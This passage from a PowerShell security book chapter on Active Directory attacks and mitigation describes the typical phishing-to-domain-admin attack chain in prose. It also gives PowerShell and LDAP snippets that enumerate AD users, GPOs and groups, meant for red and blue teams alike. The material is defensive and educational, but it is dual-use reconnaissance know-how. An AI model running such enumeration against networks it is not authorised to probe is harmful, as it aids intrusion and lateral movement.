<html><head></head><body>
		<div id="_idContainer167">
			<h1 class="chapter-number" id="_idParaDest-142"><a id="_idTextAnchor150"/>6</h1>
			<h1 id="_idParaDest-143"><a id="_idTextAnchor151"/>Active Directory – Attacks and Mitigation</h1>
			<p>When we are talking about PowerShell security, an important factor is to understand the importance of identities. It’s not PowerShell that <em class="italic">gets hacked</em> when an organization is attacked; identities get stolen and abused for lateral movement within the organization to steal more identities and to find as many identities <span class="No-Break">as possible.</span></p>
			<p>The adversary’s goal is to find a privileged identity, such as a domain administrator or shared local administrator credential, to get control over the <span class="No-Break">entire environment.</span></p>
			<p>And if we are talking about identities, one of the most important assets is Active Directory, the directory service developed by Microsoft to provide authentication and manage device configuration. In most organizations, it is the heart, where all identities are kept <span class="No-Break">and managed.</span></p>
			<p>So, whenever we authenticate a user, connect remotely, or use PowerShell at all, most of the time, there’s a user account involved that resides in the company’s <span class="No-Break">Active Directory.</span></p>
			<p>In my opinion, every security professional who is interested in PowerShell security should also have some solid knowledge of authentication, identities, and most of all, Active Directory. And this is what we will be looking into in this chapter. We will discuss a lot of theoretical content, but also investigate how red, as well as blue teamers, are <span class="No-Break">using PowerShell.</span></p>
			<p>And of course, there’s a lot more when it comes to Active Directory Security – you could write an entire book only with Active Directory security content. In this chapter, we will discuss what is most important when it comes to PowerShell security with the <span class="No-Break">following topics:</span></p>
			<ul>
				<li>Introduction to Active Directory from a security point <span class="No-Break">of view</span></li>
				<li>Enumerating and abusing <span class="No-Break">user accounts</span></li>
				<li>Privileged accounts <span class="No-Break">and groups</span></li>
				<li>Access rights and <span class="No-Break">enumerating ACLs</span></li>
				<li>Authentication protocols (LAN Manager, NTLM, <span class="No-Break">and Kerberos)</span></li>
				<li>Attacking Active <span class="No-Break">Directory authentication</span></li>
				<li>Credential theft and <span class="No-Break">lateral movement</span></li>
				<li>Microsoft baselines and the security <span class="No-Break">compliance toolkit</span></li>
			</ul>
			<h1 id="_idParaDest-144"><a id="_idTextAnchor152"/>Technical requirements</h1>
			<p>To get the most out of this chapter, ensure that you have <span class="No-Break">the following:</span></p>
			<ul>
				<li>PowerShell 7.3 <span class="No-Break">and above</span></li>
				<li>Visual Studio <span class="No-Break">Code installed</span></li>
				<li>Access to the GitHub repository <span class="No-Break">for </span><span class="No-Break"><strong class="source-inline">Chapter06</strong></span><span class="No-Break">:</span></li>
			</ul>
			<p><a href="https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/tree/master/Chapter06"><span class="No-Break">https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/tree/master/Chapter06</span></a><a href="https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-CyberSecurity/tree/master/Chapter06&#13;"/></p>
			<h1 id="_idParaDest-145"><a id="_idTextAnchor153"/>Introduction to Active Directory from a security point of view</h1>
			<p><strong class="bold">Active Directory</strong> (<strong class="bold">AD</strong>) is a <a id="_idIndexMarker934"/>directory service that you can use to<a id="_idIndexMarker935"/> manage your Windows-based networks. Released in 2000, AD quickly became the standard for enterprise <span class="No-Break">identity management.</span></p>
			<p>Using AD, you can arrange your computers, servers, and connected network devices using domains and organizational units. You can structure it within a hierarchy and use domains within the enterprise forest to separate different sub-areas from each <span class="No-Break">other logically.</span></p>
			<p>The <strong class="bold">domain</strong> <a id="_idIndexMarker936"/>or <strong class="bold">enterprise administrator</strong> roles are the most powerful roles within a domain or forest. While<a id="_idIndexMarker937"/> the <strong class="bold">domain administrator</strong> has full control over the domain they are managing, the enterprise administrator has full control over all domains within the forest, and even control over some additional forest-level attributes. Therefore, these roles should be assigned very wisely <span class="No-Break">and carefully.</span></p>
			<p>Most rights can also be delegated to fine-grain which role is allowed to do what, so an account does not necessarily need to have the domain administrator role assigned to have <span class="No-Break">similar rights.</span></p>
			<p>It is hard to <a id="_idIndexMarker938"/>keep an overview of who is allowed to do what if you don’t regularly audit delegated privileges. So, in many environments that I have seen in my life, I have seen a lot of chaos when it comes to assigned privileges. This naturally also enables attackers to have an easier job by abusing accounts that <span class="No-Break">seem inconspicuous.</span></p>
			<p>So not only are the privileges something that you want to keep under control if you are managing your AD, but you also want to protect <span class="No-Break">AD itself.</span></p>
			<p>AD is a big collection of most of the devices and accounts that are used in the organization. It does not only help attackers to enumerate the environment, but it also uses a big database that holds password hashes of all <span class="No-Break">accounts: </span><span class="No-Break"><strong class="source-inline">ntds.dit</strong></span><span class="No-Break">.</span></p>
			<p>Therefore, not<a id="_idIndexMarker939"/> only your privileged accounts need to be kept safe, but also privileged workstations (such as <strong class="bold">secure admin workstations</strong>) and servers that can be used to <span class="No-Break">administer AD.</span></p>
			<p>Once an adversary gains access to the environment (for example, through a phishing attack), they start enumerating the environment to find <span class="No-Break">valuable targets.</span></p>
			<h1 id="_idParaDest-146"><a id="_idTextAnchor154"/>How attacks work in a corporate environment</h1>
			<p>Attacks in<a id="_idIndexMarker940"/> corporate environments usually all follow the <span class="No-Break">same pattern.</span></p>
			<p>To get<a id="_idIndexMarker941"/> access to a corporate environment, the adversary usually sends a phishing email or finds a vulnerability on an external-facing server. The latter is not that easy if the <a id="_idIndexMarker942"/>company followed best practices in securing their environment (for example, by putting their web servers in a <strong class="bold">demilitarized zone</strong> (<strong class="bold">DMZ</strong>), using <strong class="bold">Web Application Firewalls</strong> (<strong class="bold">WAFs</strong>), and following<a id="_idIndexMarker943"/> secure coding <span class="No-Break">best practices).</span></p>
			<p>In case you are unfamiliar with what a WAF is, it is a type of firewall that is specifically designed to protect web applications. It monitors and filters traffic between a web application and the internet, detecting and blocking attacks such as SQL injection and <strong class="bold">cross-site scripting</strong> (<strong class="bold">XSS</strong>) attacks. By <a id="_idIndexMarker944"/>using a WAF, companies can significantly reduce the risk of attackers exploiting vulnerabilities in their <span class="No-Break">web applications.</span></p>
			<p>Therefore, the easiest and <a id="_idIndexMarker945"/>weakest link is the user. The adversary sends out a phishing email to a user (<strong class="bold">Step 1</strong>) with either a malicious document or a link that leads to a malicious <span class="No-Break">web page.</span></p>
			<p>If the user<a id="_idIndexMarker946"/> then opens the email and allows the malware to execute on their device (<strong class="bold">Step 2</strong>), the malware is executed, and – depending on how the malware<a id="_idIndexMarker947"/> was developed – it starts to deactivate common defenses such as <strong class="bold">Antimalware Scan Interface</strong> (<strong class="bold">AMSI</strong>) and the <strong class="bold">Antivirus</strong> (<strong class="bold">AV</strong>) service. It <a id="_idIndexMarker948"/>usually tries to steal all credentials that are available on the device. We will look later in this chapter into what credentials are in the <em class="italic">Credential theft</em> section – for now, just imagine that credentials are like a keycard; users can use them to access resources that only they are allowed <span class="No-Break">to access.</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer153">
					<img alt="Figure 6.1 – Credential theft and lateral movement" src="image/B16679_06_001.jpg"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.1 – Credential theft and lateral movement</p>
			<p>Now that the attacker has access to a machine within the environment, the attacker tries to establish persistence on the machine (for example, by configuring a scheduled task or creating an auto-start item). Then, the enumeration starts to find out more devices and <span class="No-Break">worthwhile identities.</span></p>
			<p>For the attacker, AD is the goal: in this identity database, the adversary can steal all identities and credentials of the entire environment. If the adversary only compromised a normal user, they cannot yet access the AD server to extract more identities, so they need to find the shortest path by stealing more identities and compromising <span class="No-Break">more systems.</span></p>
			<p>There are tools <a id="_idIndexMarker949"/>such as <strong class="bold">BloodHound</strong> that can automate the enumeration phase so that the shortest path to the AD administrator is revealed <span class="No-Break">within seconds.</span></p>
			<p>As a next step, more<a id="_idIndexMarker950"/> computers and servers are compromised and the attacker laterally moves, using the stolen credentials (<span class="No-Break"><strong class="bold">Step 3</strong></span><span class="No-Break">).</span></p>
			<p>On the target machine, again, the same steps are performed: disable detection, establish persistence, and extract <span class="No-Break">present credentials.</span></p>
			<p>This step<a id="_idIndexMarker951"/> is repeated until valuable high-privileged credentials (preferably, domain or enterprise administrator credentials) are found and extracted (<span class="No-Break"><strong class="bold">Step 4</strong></span><span class="No-Break">).</span></p>
			<p>With these high-privileged credentials, the adversary can now access the domain controllers and the AD database (<strong class="bold">Step 5</strong>) and establish persistence. Depending on the adversary’s goal, they can now carry out their plan – for example, launching a ransomware attack to encrypt the entire environment or to stay undetected and continuously <span class="No-Break">extract information.</span></p>
			<h1 id="_idParaDest-147"><a id="_idTextAnchor155"/>ADSI, ADSI accelerators, LDAP, and the 
System.DirectoryServices namespace</h1>
			<p>Before we dive deeper into enumeration and AD attacks, let’s first look into some of the most important tools that you can use to access and manipulate directory services such <span class="No-Break">as AD.</span></p>
			<p>One of those<a id="_idIndexMarker952"/> tools is called <strong class="bold">Active Directory Service Interfaces</strong> (<strong class="bold">ADSI</strong>), which is a <strong class="bold">COM-based</strong> (<strong class="bold">Component Object Model</strong>) interface<a id="_idIndexMarker953"/> for accessing directory services such <span class="No-Break">as AD.</span></p>
			<p>When working with ADSI, developers can use <strong class="bold">Lightweight Directory Access Protocol</strong> (<strong class="bold">LDAP</strong>) filters<a id="_idIndexMarker954"/> to define search criteria for directory queries. LDAP filters allow developers to construct complex queries that can return specific sets of directory data based on a variety of criteria, including attribute values, object classes, <span class="No-Break">and more.</span></p>
			<p>To get all user accounts, the<a id="_idIndexMarker955"/> LDAP filter query would <span class="No-Break">be </span><span class="No-Break"><strong class="source-inline">(sAMAccountType=805306368)</strong></span><span class="No-Break">.</span></p>
			<p>If you combine that with the <strong class="source-inline">useraccountcontrol</strong> attribute to find all regular accounts that have the “Password never expires” option set, the LDAP filter would look like <span class="No-Break">this: </span><span class="No-Break"><strong class="source-inline">(&amp;(sAMAccountType=805306368)(useraccountcontrol=66048))</strong></span><span class="No-Break">.</span></p>
			<p>You can refer to this article to get a helpful overview of LDAP <span class="No-Break">filters: </span><a href="https://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx"><span class="No-Break">https://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx</span></a><span class="No-Break">.</span></p>
			<p>ADSI is an<a id="_idIndexMarker956"/> interface to access the hierarchical namespace exposed by AD, similar to the filesystem, which represents objects in the directory such as users, groups, and computers, and their attributes. ADSI can be used from various programming languages, including C++, VBScript, and PowerShell, to access and manipulate <span class="No-Break">directory services.</span></p>
			<p>The <strong class="source-inline">System.DirectoryServices</strong> namespace is part of the .NET Framework and provides classes and methods for interacting with directory services, including AD. It is built on top of ADSI. <strong class="source-inline">System.DirectoryServices</strong> includes classes for searching, modifying, and retrieving information from directory services, as well as classes for managing security <span class="No-Break">and authentication.</span></p>
			<p>When you use the <strong class="source-inline">System.DirectoryServices</strong> namespace, you are essentially using the ADSI technology under the hood. However, you are interacting with ADSI through a higher-level set of classes and methods that provide a more intuitive and easier-to-use interface for working with <span class="No-Break">directory services.</span></p>
			<p>By using <strong class="source-inline">DirectoryServices</strong>, you can easily build your own functions, as shown in the <span class="No-Break">following example:</span></p>
			<pre class="source-code">
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.Filter = "(&amp;(sAMAccountType=805306368)(givenName=Miriam))"
$searcher.FindAll() | ForEach-Object {
    Write-Output "Name: $($_.Properties['cn'])"
    Write-Output "Username: $($_.Properties['sAMAccountName'])"
    Write-Output "Email: $($_.Properties['mail'])"
    Write-Output ""
}</pre>
			<p>In this example, we first create a new instance of the <strong class="source-inline">System.DirectoryServices.DirectorySearcher</strong> class, which is used to search for directory entries that match specific criteria <span class="No-Break">in AD.</span></p>
			<p>The <strong class="source-inline">Filter</strong> property<a id="_idIndexMarker957"/> is set to a string that defines the search criteria using LDAP syntax. In this case, the filter specifies that the search should return all user objects that have the given name, <strong class="source-inline">Miriam</strong>. Finally, the <strong class="source-inline">FindAll()</strong> method is called to execute the search, and results are piped to a <strong class="source-inline">ForEach-Object</strong> loop to display the information of each user that <span class="No-Break">was found.</span></p>
			<p>In PowerShell, the <strong class="source-inline">System.DirectoryServices</strong> namespace can be used to query AD by creating objects that represent directory entries and using a <strong class="source-inline">DirectorySearcher</strong> object to search for entries that match <span class="No-Break">specific criteria.</span></p>
			<p>Later, Microsoft introduced ADSI accelerators, which provide a shorthand syntax for accessing specific directory data types. These type accelerators allow you to use an abbreviated syntax; while the <strong class="source-inline">[adsi]</strong> type accelerator represents the <strong class="source-inline">System.DirectoryServices.DirectoryEntry</strong> class, the <strong class="source-inline">[adsisearcher]</strong> represents the <span class="No-Break"><strong class="source-inline">System.DirectoryServices.DirectorySearcher</strong></span><span class="No-Break"> class.</span></p>
			<p>For example, the following PowerShell code uses the <strong class="source-inline">System.DirectoryServices</strong> <span class="No-Break">classes directly:</span></p>
			<pre class="source-code">
$DistinguishedName = "LDAP://OU=PSSec Computers,DC=PSSec,DC=local"
([System.DirectoryServices.DirectoryEntry]$DistinguishedName).Children</pre>
			<p>This is <a id="_idIndexMarker958"/>equivalent to the following code using the <strong class="source-inline">[</strong><span class="No-Break"><strong class="source-inline">adsi]</strong></span><span class="No-Break"> accelerator:</span></p>
			<pre class="source-code">
$DistinguishedName = "LDAP://OU=PSSec Computers,DC=PSSec,DC=local"
([adsi]$DistinguishedName).Children</pre>
			<p>If we would rewrite the earlier code example to find all users with the given name <strong class="source-inline">Miriam</strong> to use the <strong class="source-inline">[adsisearcher]</strong> accelerator instead of <strong class="source-inline">DirectoryServices</strong>, the code would look <span class="No-Break">like this:</span></p>
			<pre class="source-code">
([adsisearcher]"(&amp;(sAMAccountType=805306368)(givenName=Miriam))").FindAll() | ForEach-Object {
    Write-Output "Name: $($_.Properties['cn'])"
    Write-Output "Username: $($_.Properties['sAMAccountName'])"
    Write-Output "Email: $($_.Properties['mail'])"
    Write-Output ""
}</pre>
			<p>By using ADSI, ADSI accelerators, LDAP filters, and the <strong class="source-inline">System.DirectoryServices</strong> classes, you can easily create your own custom functions for working with AD. These functions can be used to manipulate existing entries, and also for querying information from AD, which comes in very handy when it comes <span class="No-Break">to enumeration.</span></p>
			<h1 id="_idParaDest-148"><a id="_idTextAnchor156"/>Enumeration</h1>
			<p>As we learned earlier in this chapter, enumeration <a id="_idIndexMarker959"/>is always one of the first steps (and repeated several times, depending on what the adversary can access) to get more details about an environment. Enumeration helps to find out what resources are available and what access rights can <span class="No-Break">be abused.</span></p>
			<p>Of course, enumeration is a task that is not only helpful for red teamers but also for blue teamers to regularly audit permissions. It is better to see what can be enumerated in your own environment and fix/adjust it before an attacker <span class="No-Break">finds out.</span></p>
			<p>In AD, every user who has access to the corporate network can enumerate all user accounts, as well as (high-privileged) group membership. In <strong class="bold">Azure Active Directory</strong> (<strong class="bold">AAD</strong>), every <a id="_idIndexMarker960"/>user who has access to Office 365 services via the internet can enumerate AAD user accounts and group membership in <span class="No-Break">their tenant.</span></p>
			<p>Let’s start<a id="_idIndexMarker961"/> looking into enumeration in AD in this chapter. Refer to the next chapter to find out how enumeration works <span class="No-Break">in AAD.</span></p>
			<p>When it comes to AD, it is of special interest <em class="italic">which users</em> are mapped to <em class="italic">which groups</em> and <em class="italic">who is allowed to do what</em>. Accounts that reside in <em class="italic">privileged groups</em> are especially valuable <span class="No-Break">attack targets.</span></p>
			<p>An overview of which <em class="italic">users and computers exist</em> in a domain can be also very useful to plan further steps, as well as to find out which accounts<a id="_idIndexMarker962"/> have which <strong class="bold">access control lists</strong> (<strong class="bold">ACLs</strong>) to <a id="_idIndexMarker963"/>which <strong class="bold">organizational </strong><span class="No-Break"><strong class="bold">unit</strong></span><span class="No-Break"> (</span><span class="No-Break"><strong class="bold">OU</strong></span><span class="No-Break">).</span></p>
			<p>User right enumeration can be also very helpful, not only on the domain level but also on a <span class="No-Break">single system.</span></p>
			<p><strong class="bold">Group Policy Objects</strong> (<strong class="bold">GPOs</strong>) can<a id="_idIndexMarker964"/> be used to administer computers and users in a domain. So if an account that is not very well protected has the permissions to manage a GPO, this can be abused to hijack affected machines <span class="No-Break">and accounts.</span></p>
			<p>And finally, if the environment has several trusts in place, it is very valuable to find out more about these as this opens new <span class="No-Break">attack vectors.</span></p>
			<p>There are modules available such as <strong class="bold">PowerView</strong>, which <a id="_idIndexMarker965"/>was written by Will Schroeder and is a part of <strong class="bold">PowerSploit</strong>, that<a id="_idIndexMarker966"/> can help you with enumeration. Note that the PowerSploit repository is not supported anymore and will not be developed further in <span class="No-Break">the future.</span></p>
			<p>There are also great tools out there <a id="_idIndexMarker967"/>such as <strong class="bold">BloodHound</strong>, written by Andy Robbins, Rohan Vazarkar, and Will Schroeder, which help you to find the shortest path possible to a domain administrator account (usually via lateral movement and <span class="No-Break">credential theft).</span></p>
			<p>But enumerating users, groups, ACLs, trusts, and more can also be achieved by leveraging basic cmdlets that are available in the <span class="No-Break">AD module.</span></p>
			<p>I wrote some scripts that can be used by the red and blue teams for enumeration. They can be downloaded from the GitHub repository of this <span class="No-Break">book: </span><a href="https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/tree/master/Chapter06"><span class="No-Break">https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/tree/master/Chapter06</span></a><span class="No-Break">.</span></p>
			<p>But let’s look at different ways adversaries use to enumerate users, groups, and valuable attack targets. Note that this is not a complete list, as we are focusing mostly on identities and <span class="No-Break">lateral movement.</span></p>
			<h2 id="_idParaDest-149"><a id="_idTextAnchor157"/>Enumerating user accounts</h2>
			<p>Every attack <a id="_idIndexMarker968"/>usually starts with a compromised user account. Once an adversary establishes a foothold on a machine, it is used to find <a id="_idIndexMarker969"/>out more about the environment and usually to steal more identities and to <span class="No-Break">move laterally.</span></p>
			<p>Often (at least I hope and recommend so), compromised users do not have administrator access on their machines and so the adversary needs to escalate their privileges. This can be done by using a vulnerability in software that is executed locally. But going forward, it is interesting which accounts and/or groups have which rights, not only on the local machine but maybe also on <span class="No-Break">other machines.</span></p>
			<p>Therefore, it is important for blue teamers to regularly audit user rights – not only on user machines but also those configured <span class="No-Break">on servers.</span></p>
			<p>Understanding which user accounts exist in AD can be very valuable information for an adversary. This knowledge can not only be used to map them to groups and configured user rights but also once an attacker knows what accounts exist, they can launch a password <span class="No-Break">spraying attack.</span></p>
			<p>By using the <strong class="source-inline">Get-ADUser</strong> cmdlet, which is part of the <strong class="source-inline">ActiveDirectory</strong> module, you can get all user accounts that exist <span class="No-Break">within AD:</span></p>
			<pre class="source-code">
&gt; Get-ADUser -Filter *</pre>
			<p>The <strong class="source-inline">ActiveDirectory</strong> module is part of <a id="_idIndexMarker970"/>the <strong class="bold">Remote Server Administration Tools</strong> (<strong class="bold">RSAT</strong>) and <a id="_idIndexMarker971"/>can be separately <span class="No-Break">installed: </span><a href="https://docs.microsoft.com/en-us/powershell/module/activedirectory"><span class="No-Break">https://docs.microsoft.com/en-us/powershell/module/activedirectory</span></a><span class="No-Break">.</span></p>
			<p>This module is preinstalled on<a id="_idIndexMarker972"/> all <strong class="bold">domain controllers</strong>. Often, administrators have this module installed as well for <span class="No-Break">remote administration.</span></p>
			<p>Although it is <a id="_idIndexMarker973"/>possible to retrieve all user accounts within AD using tools such as PowerView or standard AD cmdlets, it’s important to note that PowerView is no longer supported and the <strong class="source-inline">ActiveDirectory</strong> module may not always be present on a target system. Therefore, it’s good to be aware of other tools that can be used <span class="No-Break">for enumeration.</span></p>
			<p>One such <a id="_idIndexMarker974"/>alternative is to use the <strong class="source-inline">[adsisearcher]</strong> accelerator with a filter such as <strong class="source-inline">(sAMAccountType=805306368)</strong>. This allows searching AD without relying on external tools or modules, as shown in the <span class="No-Break">following example:</span></p>
			<pre class="source-code">
$domain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select-Object -ExpandProperty domain
$filter = "(sAMAccountType=805306368)"
$searcher = [adsisearcher]"(&amp;(objectCategory=User)$filter)"
$searcher.SearchRoot = "LDAP://$domain"
$searcher.FindAll() | ForEach-Object {$_.GetDirectoryEntry().Name}</pre>
			<p>By using this code snippet, we will retrieve a list of all user accounts within the specified domain. By being familiar with different methods of searching AD, you can increase your chances of success in a variety <span class="No-Break">of environments.</span></p>
			<p>The <strong class="source-inline">sAMAccountType</strong> attribute is <a id="_idIndexMarker975"/>an integer value that specifies the type of object that is being created in AD. Here’s an overview of common <strong class="source-inline">sAMAccountType</strong> attributes that you can use <span class="No-Break">for enumeration:</span></p>
			<ul>
				<li><strong class="source-inline">805306368</strong>: Regular <span class="No-Break">user account</span></li>
				<li><strong class="source-inline">805306369</strong>: <span class="No-Break">Computer account</span></li>
				<li><strong class="source-inline">805306370</strong>: <span class="No-Break">Security group</span></li>
				<li><strong class="source-inline">805306371</strong>: <span class="No-Break">Distribution group</span></li>
				<li><strong class="source-inline">805306372</strong>: Security group with a domain <span class="No-Break">local scope</span></li>
				<li><strong class="source-inline">805306373</strong>: Distribution group with a domain <span class="No-Break">local scope</span></li>
				<li><strong class="source-inline">805306374</strong>: Security group with a <span class="No-Break">global scope</span></li>
				<li><strong class="source-inline">805306375</strong>: Distribution group with a <span class="No-Break">global scope</span></li>
				<li><strong class="source-inline">805306376</strong>: Security group with a <span class="No-Break">universal scope</span></li>
				<li><strong class="source-inline">805306377</strong>: Distribution group with a <span class="No-Break">universal scope</span></li>
			</ul>
			<p>In fact, all <a id="_idIndexMarker976"/>authenticated users have read <a id="_idIndexMarker977"/>access to all users, groups, OUs, and other objects, which makes enumeration an easy task <span class="No-Break">for adversaries.</span></p>
			<p>To demonstrate how such an enumeration with and without RSAT tools would look, I have written the <strong class="source-inline">Get-UsersAndGroups.ps1</strong> and <strong class="source-inline">Get-UsersAndGroupsWithAdsi.ps1</strong> scripts, which you can find in this book’s <span class="No-Break">GitHub repository:</span></p>
			<ul>
				<li><a href="https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/blob/master/Chapter06/Get-UsersAndGroups.ps1"><span class="No-Break">https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/blob/master/Chapter06/Get-UsersAndGroups.ps1</span></a></li>
				<li><a href="https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/blob/master/Chapter06/Get-UsersAndGroupsWithAdsi.ps1"><span class="No-Break">https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/blob/master/Chapter06/Get-UsersAndGroupsWithAdsi.ps1</span></a><a href="https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-CyberSecurity/blob/master/Chapter06/Get-UsersAndGroupsWithAdsi.ps1&#13;"/></li>
			</ul>
			<h1 id="_idParaDest-150"><a id="_idTextAnchor158"/>Enumerating GPOs</h1>
			<p>To<a id="_idIndexMarker978"/> enumerate which GPOs were linked in the current <a id="_idIndexMarker979"/>environment, you can use <span class="No-Break">ADSI </span><span class="No-Break">accelerators:</span></p>
			<p>By using the <strong class="source-inline">[adsi]</strong> accelerator, you can provide a <strong class="source-inline">DistinguishedName</strong> path to show the <strong class="source-inline">gplink</strong> property, which will display the GPOs linked to that particular path. To query a GPO that was linked to the <strong class="source-inline">PSSecComputers</strong> OU (<strong class="source-inline">OU=PSSecComputers,DC=PSSec,DC=local</strong>), we could use the following code snippet to <span class="No-Break">query it:</span></p>
			<pre class="source-code">
$DistinguishedName = "LDAP://OU=PSSecComputers,DC=PSSec,DC=local"
$obj = [adsi]$DistinguishedName
$obj.gplink</pre>
			<p>The following screenshot shows the result of <span class="No-Break">this query:</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer154">
					<img alt="Figure 6.2 – Querying GPOs using the ADSI accelerator" src="image/B16679_06_002.jpg"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.2 – Querying GPOs using the ADSI accelerator</p>
			<p>You can<a id="_idIndexMarker980"/> also use <strong class="source-inline">[adsisearcher]</strong> to filter for GPOs<a id="_idIndexMarker981"/> linked to the environment, as shown in the <span class="No-Break">following example:</span></p>
			<pre class="source-code">
$GpoFilter = "(objectCategory=groupPolicyContainer)"
$Searcher = [adsisearcher]$GpoFilter
$Searcher.SearchRoot = [adsi]"LDAP://DC=PSSec,DC=local"
$Searcher.FindAll() | ForEach-Object {
    Write-Host "GPO Name:" $_.Properties.displayname
    Write-Host "GPO Path:" $_.Properties.adspath
}</pre>
			<p>All GPOs that are available within this domain will be returned, as shown in the <span class="No-Break">following screenshot:</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer155">
					<img alt="Figure 6.3 – Enumerating GPOs using the adsisearcher accelerator" src="image/B16679_06_003.jpg"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.3 – Enumerating GPOs using the adsisearcher accelerator</p>
			<p>If available, it is also possible to use the <strong class="source-inline">ActiveDirectory</strong> module to query for GPOs linked <a id="_idIndexMarker982"/>to your environment. The following code snippet demonstrates how this can <span class="No-Break">be achieved:</span></p>
			<pre class="source-code">
$GpoList = Get-GPO -All -domain "PSSec.local"
$GpoList | ForEach-Object {
    Write-Host "GPO Name:" $_.DisplayName
    Write-Host "GPO Path:" $_.Path
}</pre>
			<p>In addition <a id="_idIndexMarker983"/>to enumerating GPOs, enumerating groups is also an important part, which we’ll focus on in the <span class="No-Break">next section.</span></p>
			<h1 id="_idParaDest-151"><a id="_idTextAnchor159"/>Enumerating groups</h1>
			<p>Understanding <a id="_idIndexMarker984"/>which user accounts are part of which <a id="_idIndexMarker985"/>group is very valuable information for an attacker. Through this, they can quickly understand whether certain accounts might have access to <span class="No-Break">other computers.</span></p>
			<p>But this is also a task that blue teamers should pursue on a regular basis; often, systems and access rights are not hardened enough, so it is valuable to understand which users are part of which AD group and to <span class="No-Break">adjust it.</span></p>
			<p>In the longer term, it also makes sense to implement monitoring to immediately get alerted if an AD group membership changes that was <span class="No-Break">not intended.</span></p>
			<p>To get started enumerating your AD groups, I have written a simple script for you, which displays the groups, as well as their <span class="No-Break">members: </span><a href="https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/blob/master/Chapter06/Get-UsersAndGroups.ps1"><span class="No-Break">https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/blob/master/Chapter06/Get-UsersAndGroups.ps1</span></a><span class="No-Break">.</span></p>
			<p>Once you’ve downloaded the script, you can either use it and progress the output further as a PowerShell object, or you can pipe it to the <strong class="source-inline">Export-Csv</strong> function, which might make your <span class="No-Break">analysis easier:</span></p>
			<pre class="source-code">
&gt; .\Get-UsersAndGroups.ps1 | Export-Csv -Path C:\tmp\ADGroups.csv</pre>
			<p>The output is exported as a <strong class="source-inline">.csv</strong> file under the <strong class="source-inline">C:\tmp\ADGroups.csv</strong> path. Now, you can process the file as <span class="No-Break">you like.</span></p>
			<p>One option is to import it as external data to Excel and to create a pivot table to better understand your <span class="No-Break">group membership.</span></p>
			<p>Since Excel and <a id="_idIndexMarker986"/>Power Pivot will not be part of this book, I <a id="_idIndexMarker987"/>will not explain how to do it, but there are great resources to learn more about those technologies, including <span class="No-Break">the following:</span></p>
			<ul>
				<li>Import or export text (<strong class="source-inline">.txt</strong> or <strong class="source-inline">.csv</strong>) <span class="No-Break">files: </span><a href="https://support.microsoft.com/en-us/office/import-or-export-text-txt-or-csv-files-5250ac4c-663c-47ce-937b-339e391393ba"><span class="No-Break">https://support.microsoft.com/en-us/office/import-or-export-text-txt-or-csv-files-5250ac4c-663c-47ce-937b-339e391393ba</span></a><a href="https://support.microsoft.com/en-us/office/import-or-export-text-txt-or-csv-files-5250ac4c-663c-47ce-937b-339e391393ba&#13;"/></li>
				<li><em class="italic">Tutorial: Import Data into Excel and Create a Data </em><span class="No-Break"><em class="italic">Model</em></span><span class="No-Break">: </span><a href="https://support.microsoft.com/en-us/office/tutorial-import-data-into-excel-and-create-a-data-model-4b4e5ab4-60ee-465e-8195-09ebba060bf0"><span class="No-Break">https://support.microsoft.com/en-us/office/tutorial-import-data-into-excel-and-create-a-data-model-4b4e5ab4-60ee-465e-8195-09ebba060bf0</span></a><a href="https://support.microsoft.com/en-us/office/tutorial-import-data-into-excel-and-create-a-data-model-4b4e5ab4-60ee-465e-8195-09ebba060bf0&#13;"/></li>
				<li><em class="italic">Create a PivotTable to analyze worksheet </em><span class="No-Break"><em class="italic">data</em></span><span class="No-Break">: </span><a href="https://support.microsoft.com/en-gb/office/create-a-pivottable-to-analyze-worksheet-data-a9a84538-bfe9-40a9-a8e9-f99134456576"><span class="No-Break">https://support.microsoft.com/en-gb/office/create-a-pivottable-to-analyze-worksheet-data-a9a84538-bfe9-40a9-a8e9-f99134456576</span></a><a href="https://support.microsoft.com/en-us/office/create-a-pivottable-to-analyze-worksheet-data-a9a84538-bfe9-40a9-a8e9-f99134456576&#13;"/></li>
			</ul>
			<p>I have created some demo files that I exported from my <strong class="source-inline">PSSec</strong> demo lab, which you can find in the GitHub repository of this <span class="No-Break">book: </span><a href="https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/tree/master/Chapter06/EnumeratingGroups"><span class="No-Break">https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/tree/master/Chapter06/EnumeratingGroups</span></a><span class="No-Break">.</span></p>
			<p>These examples are only a suggestion for how you could import the <strong class="source-inline">.csv</strong> files and create a PowerPivot table to further analyze the AD group membership in <span class="No-Break">your environment.</span></p>
			<h1 id="_idParaDest-152"><a id="_idTextAnchor160"/>Privileged accounts and groups</h1>
			<p>A privileged account <a id="_idIndexMarker988"/>is an account that has more rights and privileges than a <em class="italic">normal</em> account and therefore needs to be cared especially for <span class="No-Break">their security.</span></p>
